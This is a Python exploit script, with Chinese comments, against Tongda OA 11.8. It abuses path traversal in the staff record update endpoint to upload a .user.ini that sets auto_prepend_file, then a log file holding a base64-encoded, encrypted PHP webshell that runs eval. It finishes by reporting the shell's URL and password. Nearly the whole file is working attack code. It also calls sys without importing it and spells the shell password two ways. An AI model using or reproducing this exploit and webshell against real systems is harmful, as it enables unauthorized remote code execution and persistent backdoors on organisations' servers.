import requests
import time
import base64

def Upload_Ini(host): ## 通达11.8上传user.ini文件
    print('[->] 正在检测<V11.8上传.user.ini文件包含漏洞')
    # print(("Cookie格式: USER_NAME_COOKIE=admin; PHPSESSID=xxxxx; OA_USER_ID=admin; SID_1=xxxx"))
    print(("Cookie格式:PHPSESSID=xxxxx"))
    cookie = input(('请输入你的cookie: '))
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Cookie': cookie,
        'Content-Type': 'multipart/form-data; boundary=---------------------------17518323986548992951984057104',
    }
    payload = 'general/hr/manage/staff_info/update.php?USER_ID=../../general\\reportshop\workshop\\report\\attachment-remark/.user'
    data = base64.b64decode(
        'LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0iMTExMTExLmluaSIKQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluCgphdXRvX3ByZXBlbmRfZmlsZT0xMTExMTEubG9nCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQKQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJzdWJtaXQiCgrmj5DkuqQKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNC0t')
    try:
        res = requests.post(url=host + payload, data=data, headers=headers, timeout=5)
        if res.status_code == 200 and '档案已保存' in res.text:
            print('[*] 成功上传.user.ini文件!')
            Upload_Log(host, cookie)
            sys.exit(0)
        else:
            print('[-] 上传.user.ini文件失败!')
            sys.exit(0)
    except:
        pass

def Upload_Log(target_url,cookie): ## 上传日志文件
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Cookie': cookie,
        'Content-Type': 'multipart/form-data; boundary=---------------------------17518323986548992951984057104',
    }
    payload = 'general/hr/manage/staff_info/update.php?USER_ID=../../general\\reportshop\workshop\\report\\attachment-remark/111111'
    data = base64.b64decode(
        'LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0iMTExMTExLmxvZyIKQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluCgo8P3BocApAZXJyb3JfcmVwb3J0aW5nKDApOyBzZXNzaW9uX3N0YXJ0KCk7CiAgICAka2V5PSJlNDVlMzI5ZmViNWQ5MjViIjsKCSRfU0VTU0lPTlsnayddPSRrZXk7CglzZXNzaW9uX3dyaXRlX2Nsb3NlKCk7CgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsKCWlmKCFleHRlbnNpb25fbG9hZGVkKCdvcGVuc3NsJykpCgl7CgkJJHQ9ImJhc2U2NF8iLiJkZWNvZGUiOwoJCSRwb3N0PSR0KCRwb3N0LiIiKTsKCQkKCQlmb3IoJGk9MDskaTxzdHJsZW4oJHBvc3QpOyRpKyspIHsKICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgCiAgICAJCQl9Cgl9CgllbHNlCgl7CgkJJHBvc3Q9b3BlbnNzbF9kZWNyeXB0KCRwb3N0LCAiQUVTMTI4IiwgJGtleSk7Cgl9CiAgICAkYXJyPWV4cGxvZGUoJ3wnLCRwb3N0KTsKICAgICRmdW5jPSRhcnJbMF07CiAgICAkcGFyYW1zPSRhcnJbMV07CgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2ludm9rZSgkcCkge2V2YWwoJHAuIiIpO319CiAgICBAY2FsbF91c2VyX2Z1bmMobmV3IEMoKSwkcGFyYW1zKTsKPz4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0=')
    try:
        res = requests.post(url=target_url + payload, data=data, headers=headers, timeout=5)
        if res.status_code == 200 and '档案已保存' in res.text:
            print('[*] 成功上传log文件!')
            Get_Shell(target_url, cookie)
            sys.exit(0)
        else:
            print('[-] 上传log文件失败!\n')
            sys.exit(0)
    except:
        pass

def Get_Shell(target_url,cookie): ## 通达11.8getshell
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360',
        'Cookie': cookie
    }
    payload = 'general/reportshop/workshop/report/attachment-remark/form.inc.php'
    try:
        res = requests.get(url=target_url + payload, headers=headers, timeout=5)
        if res.status_code == 200:
            print('[*] 成功上传蚁剑shell, 密码为: rebeyond')
            print('[*] Shell地址为: {}'.format(target_url + payload) + '\n')
            sys.exit(0)
        else:
            print('[*]  成功上传蚁剑shell, 密码为: rebyeond')
            print('[*] Shell地址为: {}'.format(target_url + payload))
            print('[!] 可能需要等待一会儿即可连接。\n')
            sys.exit(0)
    except:
        pass

def run(host):
    time.sleep(8)
    Upload_Ini(host)